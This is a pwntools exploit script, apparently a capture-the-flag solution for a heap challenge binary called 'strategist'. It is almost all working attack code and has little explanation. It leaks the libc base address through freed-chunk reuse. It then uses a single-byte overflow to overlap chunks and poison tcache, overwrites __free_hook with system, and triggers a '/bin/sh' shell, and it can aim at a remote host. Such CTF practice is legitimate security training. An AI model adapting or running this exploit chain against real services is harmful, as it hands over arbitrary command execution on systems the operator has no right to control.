#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('strategist')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_plan(size, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", str(size).encode())
    io.sendafter(b">", data)


def show_plan(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"[0]:")
    data = u64(io.recv(7)[1:].strip(b"\n").ljust(8, b"\x00"))
    return data

def edit_plan(idx, data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", str(idx).encode())
    io.sendafter(b">", data)

def delete_plan(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(idx).encode())


def solve():

    create_plan(0x420, b"a")
    create_plan(0x420, b"b")

    delete_plan(0)
    delete_plan(1)

    create_plan(0x420, b"\x40")
    libc.address = show_plan(0) - 0x3ebc40

    info("libc base: %#x", libc.address)

    delete_plan(0)
    create_plan(0x48, b"A"*0x48)
    create_plan(0x48, b"B"*0x48)
    create_plan(0x48, b"C"*0x48)
    edit_plan(0, b"A"*0x48 + p8(0x80))

    for i in range(1, 3):
        delete_plan(i)
    
    create_plan(0x70, b"B"*0x50 + p64(libc.sym["__free_hook"]))
    create_plan(0x40, b"/bin/sh\x00")
    create_plan(0x40, p64(libc.sym["system"]))

    delete_plan(2)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

